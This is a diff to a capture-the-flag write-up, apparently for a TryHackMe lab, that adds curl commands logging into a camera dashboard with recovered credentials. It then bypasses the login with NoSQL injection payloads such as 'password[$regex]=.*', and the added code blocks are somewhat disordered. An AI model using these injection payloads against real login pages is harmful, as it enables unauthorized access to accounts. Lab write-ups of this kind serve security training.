@@ -224,10 +224,102 @@ ROW=0
 
 With this username / password combination in hand we can now head abck to the browser and log in to the camera's web interface, where we are greeted by the first flag for this challenge.
 
-![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/65a346a5-30b7-4333-ade8-422587966199)
+![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/b9060a2e-bc9a-4221-be0a-fef6d4a222e7)
+
+```
+$ curl http://10.10.188.58:8080
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   461  100   461    0     0   5971      0 --:--:-- --:--:-- --:--:--  6681
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>401 Unauthorized</title>
+</head><body>
+<h1>Unauthorized</h1>
+<p>This server could not verify that you
+are authorized to access the document
+requested.  Either you supplied the wrong
+credentials (e.g., bad password), or your
+browser doesn't understand how to supply
+the credentials required.</p>
+<hr>
+<address>Apache/2.4.57 (Debian) Server at 10.10.188.58 Port 8080</address>
+</body></html>
+
+
+```
+curl -u 'admin:Y3tiStarCur!ouspassword=admin' -s http://10.10.188.58:8080/
+<br />
+<b>Warning</b>:  Undefined array key "user" in <b>/var/www/html/index.php</b> on line <b>19</b><br />
+<!DOCTYPE html>
+<html lang="en" class="h-full bg-thm-800">
+
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TryHackMe | Cyber Police Dashboard</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
 ```
 
-...
+```
+$ curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' http://10.10.61.217:8080/login.php -X POST -d 'username=admin&password=Y3tiStarCur!ouspassword=admin' -c cookie.txt -L
+```
+
+```
+curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' http://10.10.188.58:8080/login.php -X POST -d 'username=admin&password=Y3tiStarCur!ouspassword=admin' -c cookie.txt -L
+
+<!DOCTYPE html>
+<html lang="en" class="h-full bg-thm-900">
+
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TryHackMe</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+```
+
+
+```
+$ curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' http://10.10.188.58:8080/login.php -X POST -d 'username[$regex]=.*&password[$regex]=.*' -c cookie.txt -L
+$ 
+<!DOCTYPE html>
+<html lang="en" class="h-full bg-thm-800">
+
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TryHackMe | Cyber Police Dashboard</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+```
+
+
+```
+$ curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' http://10.10.188.58:8080/login.php -X POST -d 'username=Frosteau&password[$regex]=.*' -c cookie.txt -L
+$ 
+<!DOCTYPE html>
+<html lang="en" class="h-full bg-thm-800">
+
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TryHackMe | Cyber Police Dashboard</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+
+```
+![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/2689690b-8ea5-4594-80c2-9e2e36f0a32e)
+
+
+
+```
+    
 ```
 
 
